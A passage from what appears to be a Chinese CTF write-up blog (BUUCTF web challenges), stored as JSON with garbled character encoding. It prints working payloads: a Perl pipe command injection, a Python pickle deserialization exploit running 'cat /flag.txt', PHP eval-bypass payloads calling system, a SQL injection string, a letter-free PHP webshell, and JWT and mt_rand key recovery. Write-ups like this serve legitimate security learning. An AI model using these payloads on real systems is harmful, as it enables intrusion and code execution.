|ï¼‰ç»“å°¾ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å†™å…¥ã€‚è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæƒé™æ˜¯å½“å‰çš„ç™»å½•è€…ã€‚å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ ä¼šçœ‹åˆ°perlç¨‹åºè¿è¡Œçš„ç»“æœã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨urlå‚æ•°ä¸­ä¼ å…¥è¯»å–flagçš„å‘½ä»¤ï¼Œç„¶åå†™è¿›æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬åœ¨æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥è·å–flagäº†ã€‚ payloadï¼š 1?url=/&amp;filename=a æŸ¥çœ‹åœ¨æ ¹ç›®ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°readflagæ–‡ä»¶ï¼Œå› æ­¤ä½¿ç”¨bashå‘½ä»¤æ‰§è¡Œreadflagã€‚æˆ‘ä»¬éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªä¸æˆ‘ä»¬éœ€è¦æ‰§è¡Œå‘½ä»¤ç›¸åŒçš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ç®¡é“æˆªè·è¯¥æµç¨‹ï¼Œä½¿ä¹‹ä¸ºå‘½ä»¤çš„æ‰§è¡Œï¼Œè¿™é‡Œè¦åˆ›å»ºä¸€æ¨¡ä¸€æ ·çš„æ–‡ä»¶ï¼š 1?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| æœ€åä¿®æ”¹å­˜å‚¨çš„æ–‡ä»¶ï¼Œå¹¶è¯»å–flagè¾“å…¥åˆ°å­˜å‚¨çš„æ–‡ä»¶ä¸­å»ï¼Œè¯»å–flagï¼š 1?url=file:bash -c /readflag|&amp;filename=mrl64 [CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikunè¿›å…¥ç½‘é¡µå‘Šè¯‰æˆ‘ä»¬è¦ä¹°åˆ°lv6çˆ†ç ´Bç«™ï¼Œå®£å‘Šikunä¸»æƒï¼Œå¤ªçˆ±äº†ã€‚ç„¶åæ³¨å†Œè´¦å·ç™»å½•ï¼Œå‘ç°è‡ªå·±æœ‰1000å…ƒï¼Œå¥½ç»“æœæ‰¾äº†å•†åº—æ‰¾äº†åé¡µéƒ½æ²¡æ‰¾åˆ°lv6ï¼Œå¤ªçˆ±äº†ã€‚ ç›´æ¥å†™è„šæœ¬æ‰¾lv6ï¼š 12345678910111213import requestsimport timeurl = &quot;http://47a66447-4bfa-417f-9165-0bccf73f8701.node4.buuoj.cn:81/shop&quot;params = &#123;&quot;page&quot;: &quot;&quot;&#125;flag= &quot;&quot;for i in range(1, 500): params[&quot;page&quot;] = i r = requests.get(url, params=params) time.sleep(1)//buuè®¿é—®é™åˆ¶ if &quot;lv6.png&quot; in r.text: print(i) break æœ€åæ‰¾åˆ°åœ¨181é¡µï¼Œå…´å†²å†²è¿›å»å‘ç°æ€ä¹ˆä»·æ ¼è¿™ä¹ˆè‡­å•Š(bushiï¼Œ1145141919å…ƒæ ¹æœ¬ä¹°ä¸èµ·ï¼Œæ€€ç–‘å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œå‰ç«¯æ›´æ”¹ç›¸å…³å‚æ•°ï¼Œå‘ç°æ›´æ”¹æŠ˜æ‰£åä¸æ˜¯å›æ˜¾æ“ä½œå¤±è´¥ï¼Œè€Œæ˜¯åªå…è®¸ç®¡ç†å‘˜è®¿é—®ã€‚ æ²¡æœ‰å‘ç°ç™»å½•æ¼æ´ï¼Œå‚¨å­˜ä¸­å‘ç°JWTï¼Œåº”è¯¥æ˜¯æ›´æ”¹jwtï¼Œæ›´æ”¹usernameä¸ºadminåå‘ç°ä¾ç„¶æ— æ³•è´­ä¹°æˆåŠŸï¼Œé‚£åº”è¯¥æ˜¯å­˜åœ¨å¯†é’¥çš„ï¼Œä½¿ç”¨c-jwt-crackerå·¥å…·è¿›è¡Œçˆ†ç ´ï¼Œçˆ†å‡ºç§é’¥ä¸º1Kunã€‚ æ›´æ”¹jwtåæˆåŠŸä¹°åˆ°6çº§å·ï¼Œä½†æ˜¯è¿˜è¦æˆ‘ä»¬æˆä¸ºå¤§ä¼šå‘˜ï¼Œéº»äº†æ€ä¹ˆè¿˜æœ‰ï¼Œå½“ikunå¥½ç´¯ã€‚ç‚¹å‡»æŒ‰é’®å‘ç°æ²¡ç”¨ï¼ŒæŸ¥çœ‹æºç å‘ç°å­˜åœ¨/static/asd1f654e683wq/www.zipï¼Œä¸‹è½½æºç ã€‚ Admin.pyï¼š 1234567891011121314151617181920212223import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == &quot;admin&quot;: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) else: return self.render(&#x27;no_ass.html&#x27;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(&#x27;become&#x27;) p = pickle.loads(urllib.unquote(become)) return self.render(&#x27;form.html&#x27;, res=p, member=1) except: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) å¥½å®¶ä¼™çœ‹åˆ°tornadoæœ¬æ¥ä»¥ä¸ºæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œåæ¥å‘ç°è¿™é‡Œæ˜¯pickleååºåˆ—åŒ–æ¼æ´ã€‚å‚è€ƒæ–‡ç« ï¼šPython Pickleååºåˆ—åŒ–æ¼æ´ ä¹‹ååº”è¯¥ä¹Ÿä¼šå†™ä¸€ä¸ªpickleååºåˆ—åŒ–çš„åšå®¢ã€‚ é‚£ä¹ˆæ ¹æ®æ–‡ç« å†…å®¹ï¼Œæˆ‘ä»¬æ„é€ pocï¼š 12345678910import pickleimport urllibimport commandsclass payload(object): def __reduce__(self): return (commands.getoutput,(&#x27;cat /flag.txt&#x27;,))a = payload()print urllib.quote(pickle.dumps(a)) æœ€åæŠ“åŒ…å¹¶å°†payloadä¼ å€¼ç»™becomeå³å¯è·å–flagã€‘ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"buuç»ƒä¹ 7","slug":"buuç»ƒä¹ 7","date":"2022-04-14T07:11:52.000Z","updated":"2022-04-14T12:33:47.133Z","comments":true,"path":"2022/04/14/buuç»ƒä¹ 7/","link":"","permalink":"http://example.com/2022/04/14/buu%E7%BB%83%E4%B9%A07/","excerpt":"å‰è¨€å¥½ä¹…æ²¡åˆ·buuäº†ï¼Œç»§ç»­åˆ·","text":"å‰è¨€å¥½ä¹…æ²¡åˆ·buuäº†ï¼Œç»§ç»­åˆ· [CISCN 2019 åˆèµ›]Love Mathå®¡è®¡ä»£ç ï¼š 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; è¿™é¢˜è¦æˆ‘ä»¬åªä½¿ç”¨ç™½åå•ä¸­çš„æ•°å­¦å‡½æ•°æ¥è¿›è¡Œrceï¼Œæˆ‘ä»¬å‘ç°å­˜åœ¨é»‘ç™½åå•ï¼Œä½†æ˜¯ç¿»é˜…é¢˜ç›®ç»™æˆ‘ä»¬çš„æ–‡æ¡£ï¼Œæˆ‘ä»¬å‘ç°ä»¥ä¸‹ä¸‰ä¸ªå‡½æ•°ï¼š base_convert()ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­— dechex()ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ hex2bin()ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIå­—ç¬¦ ç™½åå•ä¸­ä¸å­˜åœ¨hex2bin()ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨å¦å¤–çš„å‡½æ•°æ„å»ºï¼š 12base_convert(37907361743,10,36)//hex2bin è¿™ä¸‰ä¸ªå‡½æ•°ç›¸äº’åˆ©ç”¨å°±å¯ä»¥è¡¨ç¤ºå‡ºæ‰€æœ‰çš„å­—ç¬¦äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹æ‰§è¡Œéƒ¨åˆ†ï¼š 1eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;); æˆ‘ä»¬è‚¯å®šæƒ³è¦æ„é€ è¿™æ ·çš„payloadï¼š 1eval(&#x27;echo&#x27;.$_GET[a]($_GET[b])&amp;a=system&amp;b=cat /flag.&#x27;;&#x27;); é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡º_GETï¼š 1base_convert(37907361743,10,36)(dechex(1598506324)) æ¥ç€åˆ©ç”¨å˜é‡è¦†ç›–æ„é€ payloadç»•è¿‡æ£€æµ‹ï¼Œè·å–flagï¼š 1?c=$log=base_convert(37907361743,10,36)(dechex(1598506324));$$log&#123;pi&#125;($$log&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag ç”±äºé•¿åº¦é™åˆ¶å¯¼è‡´è¿™é¢˜åŸºæœ¬ä¸å¯èƒ½ç”¨å¼‚æˆ–æ¥ç»•è¿‡ï¼Œåªèƒ½è¯´æ˜¯ä¸€ç§æ€è·¯å§ã€‚ [MRCTF2020]Ezauditå‘ç°å­˜åœ¨www.zipæ³„éœ²ï¼ŒæŸ¥çœ‹æºç index.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header(&#x27;Content-type:text/html; charset=utf-8&#x27;);error_reporting(0);if(isset($_POST[&#x27;login&#x27;]))&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $Private_key = $_POST[&#x27;Private_key&#x27;]; if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123; // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢ header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;; exit;&#125; else if($Private_key != &#x27;*************&#x27; ) &#123; header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;; exit; &#125; else&#123; if($Private_key === &#x27;************&#x27;)&#123; $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#x27;s private_key??? å®¡è®¡ä»£ç å‘ç°éœ€è¦è´¦å·å¯†ç ä»¥åŠå¯†é’¥ï¼Œä¸è¿‡é€šè¿‡è§‚å¯Ÿsqlè¯­å¥æˆ‘ä»¬å‘ç°å¯ä»¥ä½¿ç”¨ä¸‡èƒ½å¯†ç ç»•è¿‡ï¼š 11&#x27;or&#x27;1&#x27;=&#x27;1 å› æ­¤æœ€é‡è¦çš„éƒ¨åˆ†å°±åœ¨äºè·å–å¯†é’¥äº†ã€‚æˆ‘ä»¬å‘ç°åœ¨ç”Ÿæˆå…¬é’¥ä¸ç§é’¥çš„è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ˜¯mt_rand()ä¼ªéšæœºã€‚ é¦–å…ˆç®—å‡ºä¼ªéšæœºå€¼ï¼Œexpï¼š 12345678910s = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;key = &#x27;KVQP0LdJKRaV3n9D&#x27;m = &#x27;&#x27;for i in key: for j in range(len(s)): if i == s[j]: m += &quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)print(m)//36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 ä½¿ç”¨php_mt_seedå·¥å…·è®¡ç®—ç§å­ï¼Œå¾—åˆ°seed=1775196155ï¼Œphpç‰ˆæœ¬5.2.1-7.0ï¼Œå› æ­¤åœ¨ç‰ˆæœ¬èŒƒå›´å†…æŒ‡å®šseedmt_srand(1775196155);ï¼Œå†æ‰§è¡Œç¨‹åºè·å–ç§é’¥ä¸ºKVQP0LdJKRaVã€‚ æœ€åç™»å½•å¾—åˆ°flagã€‚ è¿™é¢˜å’Œ[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–å·®ä¸å¤šï¼Œå› æ­¤æŠ½å¥–è¿™é¢˜å°±ä¸å†™äº†ã€‚ [GXYCTF2019]StrongestMindç®—1000ä¸ªå¼å­å°±å¯ä»¥è·å–flagï¼Œè€ƒpythonçš„expç¼–å†™ï¼š 12345678910111213141516171819202122232425import reimport requestsfrom time import sleepdef count(): s = requests.session() url = &#x27;http://631df4ea-649b-4f91-aff7-fef637d6fc0b.node4.buuoj.cn:81/&#x27; match = re.compile(r&quot;[0-9]+ [+|-] [0-9]+&quot;) r = s.get(url) for i in range(1001): sleep(0.1) str = match.findall(r.text)[0] # print(eval(str)) data = &#123;&quot;answer&quot; : eval(str)&#125; r = s.post(url, data=data) r.encoding = &quot;utf-8&quot; print(&#x27;&#123;&#125; : &#123;&#125;&#x27;.format(i,eval(str))) # print(r.text) print(r.text)if __name__ == &#x27;__main__&#x27;: count() è¿™é‡Œä¸»è¦å­¦ä¹ äº†pythonå…³äºæ­£åˆ™è¡¨è¾¾å¼çš„åº“â€”â€”reçš„åˆ©ç”¨ã€‚æ•´ä¸ªä»£ç çš„é€»è¾‘å…¶å®å¾ˆç®€å•ï¼Œæ­£åˆ™åŒ¹é…ç½‘é¡µå†…å®¹ä¸­çš„åŠ å‡ç®—å¼ï¼Œå¹¶å°†ç®—å¼å½“æˆå‘½ä»¤ç›´æ¥æ‰§è¡Œå¯ä»¥å¾—åˆ°ç»“æœï¼Œæœ€åpostå›å»å¾—åˆ°ä¸‹ä¸€å…³çš„å¼å­ï¼Œå¾ªç¯1000æ¬¡å¾—åˆ°flagã€‚è¿™æ ·æƒ³æƒ³ä¹‹å‰hgame2022 week1çš„webé‚£é¢˜åº”è¯¥ä¹Ÿæ˜¯å·®ä¸å¤šçš„ã€‚ [ISITDTU 2019]EasyPHPRCEé¢˜ï¼Œå®¡è®¡æºç ï¼š 123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) ) die(&#x27;rosÃ© will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#x27;you are so close, omg&#x27;);eval($_);?&gt; é—®é¢˜å¾ˆç®€å•ï¼Œç»•è¿‡ä¸¤ä¸ªifçš„è¿‡æ»¤å°±å¯ä»¥äº†ï¼Œç¬¬ä¸€ä¸ªifå¾ˆæ˜æ˜¾æ˜¯ä¸ªæ­£åˆ™åŒ¹é…çš„é»‘åå•ï¼Œè€Œç¬¬äºŒä¸ªifèµ·åˆ°çš„ä½œç”¨æ˜¯é™åˆ¶æˆ‘ä»¬ä½¿ç”¨å­—ç¬¦çš„æ•°é‡ï¼Œä¹Ÿå°±æ˜¯åœ¨æ•´ä¸ªpayloadä¸­æˆ‘ä»¬åªèƒ½ä½¿ç”¨12ä¸ªå­—ç¬¦ã€‚ å–åç»•è¿‡ï¼ŒæŸ¥çœ‹phpinfoï¼š 1?_=(~%8f%97%8f%96%91%99%90)(); ç„¶åæŸ¥çœ‹disable_functionsï¼š 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open, å™©è€—å•Šè¿™æ˜¯ï¼ŒåŸºæœ¬shelléƒ½è¢«ç¦ç”¨äº†ï¼Œä¸è¿‡æˆ‘ä»¬æ°¸è¿œæ»´ç¥print_r(scandir(.))è¿˜åœ¨ï¼Œæˆ‘ä»¬è¿˜æœ‰å¸Œæœ›ã€‚ ä½†æ˜¯å–åçš„æ—¶å€™æˆ‘ä»¬å‘ç°ç¬¬äºŒä¸ªifçš„æ¡ä»¶æ— æ³•è¢«æ»¡è¶³ï¼Œç¬¬äºŒä¸ªå™©è€—ä¼ æ¥äº†å±äºæ˜¯ï¼Œä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬å‘ç°å¼‚æˆ–ä¹Ÿæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè€Œä¸”å–åæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨^(%FF%FF%FF%FF%FF%FF%FF)è¿›è¡Œæ›¿ä»£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ payloadäº†ï¼š 1?_=((%8F%9E%96%9C%9C%A0%9E)^(%FF%9C%FF%9B%9B%FF%9C)^(%FF%8F%FF%96%8C%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF))(((%8C%9C%9E%9C%9B%96%9E)^(%FF%FF%FF%9B%FF%FF%9C)^(%FF%FF%FF%96%FF%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF))); è·å–åˆ°æ–‡ä»¶ï¼Œç”¨readfile()æ¥è¯»å–ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶åè¶…çº§é•¿ï¼Œæˆ‘ä»¬å‡ ä¹ä¸å¯èƒ½åœ¨å¼‚æˆ–è¿™ä¸ªæ–‡ä»¶åçš„æƒ…å†µä¸‹æ»¡è¶³ç¬¬äºŒä¸ªifï¼Œå› æ­¤è¿™é‡Œè¦åˆ©ç”¨flagæ–‡ä»¶åœ¨æœ€åçš„è¿™ä¸€ç‚¹ï¼Œä½¿ç”¨end()æ¥è¯»å–ï¼Œpayloadï¼š 123readfile(end(scandir(.)))?_=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF))); [SUCTF 2018]GetShellè¿›å…¥ç½‘é¡µï¼Œå‘ç°æ˜¯uploadï¼ŒåŒæ—¶ç»™å‡ºäº†éƒ¨åˆ†ä»£ç ï¼š 12345678if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123; $data=substr($contents,5); foreach ($black_char as $b) &#123; if (stripos($data, $b) !== false)&#123; die(&quot;illegal char&quot;); &#125; &#125; &#125; è¿™ä¸²ä»£ç å¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œæµ‹è¯•å‘ç°åŸºæœ¬ä¸Šä¸èƒ½å­˜åœ¨å­—æ¯ï¼Œåˆ©ç”¨ä¹‹å‰è®²è¿‡çš„æ— å­—ç¬¦webshellï¼Œç”±äºä¸èƒ½æœ‰å¼•å·ï¼Œå› æ­¤è¦æ”¹å†™ä¸‹shellï¼š 1234567&lt;?=$__=[];$____=$__==$__;$_=~(åŒ—)[$____];$_.=~(ç†™)[$____];$_.=~(åŒ—)[$____];$_.=~(æ‹¾)[$____];$_.=~(çš„)[$____];$_.=~(å’Œ)[$____];$___=~(æ ·)[$____];$___.=~(è¯´)[$____];$___.=~(å°)[$____];$___.=~(æ¬¡)[$____];$___.=~(ç«™)[$____];$____=~(ç°)[$____];$_($$___[$_]);//system($_POST[system]); ä¸Šä¼ æ–‡ä»¶åå°±å¯ä»¥æ‰§è¡Œrceäº†ã€‚çœ‹äº†åˆ«äººçš„wpå‘ç°ç”±äºç¯å¢ƒé…ç½®é—®é¢˜flagæ²¡å†™è¿›æ–‡ä»¶ï¼Œå› æ­¤æŸ¥çœ‹ç¯å¢ƒå˜é‡envè·å–flagã€‚ [N1CTF 2018]eating_cmsè¿›å…¥ç½‘é¡µå‘ç°ç™»å½•ï¼Œæ‰«æç›®å½•å‘ç°register.phpï¼Œæ³¨å†Œåç™»å½•ã€‚ è¿›å…¥ç½‘é¡µå‘ç°urlæœ‰ä¸ªpageå‚æ•°ï¼Œä¼°è®¡æ˜¯ä¼ªåè®®ï¼Œå°è¯•è¯»å–æºä»£ç ï¼š 1?page=php://filter/convert.base64-encode/resource=user æˆåŠŸï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once(&quot;function.php&quot;);if( !isset( $_SESSION[&#x27;user&#x27;] ))&#123; Header(&quot;Location: index.php&quot;);&#125;if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; $oper_you_can_do = $OPERATE_admin;&#125;else&#123; $oper_you_can_do = $OPERATE;&#125;//die($_SESSION[&#x27;isadmin&#x27;]);if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; if(!isset($_GET[&#x27;page&#x27;]) || $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;info&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; &#125;&#125;else&#123; if(!isset($_GET[&#x27;page&#x27;])|| $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;guest&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; if($page === &#x27;info&#x27;) &#123;// echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;); Header(&quot;Location: user.php?page=guest&quot;); &#125; &#125;&#125;filter_directory();//if(!in_array($page,$oper_you_can_do))&#123;// $page = &#x27;info&#x27;;//&#125;include &quot;$page.php&quot;;?&gt; è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½è¯»å–ä¿¡æ¯ï¼Œæ²¡çœ‹å‡ºä»€ä¹ˆï¼Œç»§ç»­è¯»å–functionï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123; Header(&quot;Location: hacker.php&quot;); die();&#125;function filter_directory()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = &quot;select * from `albert_users` where 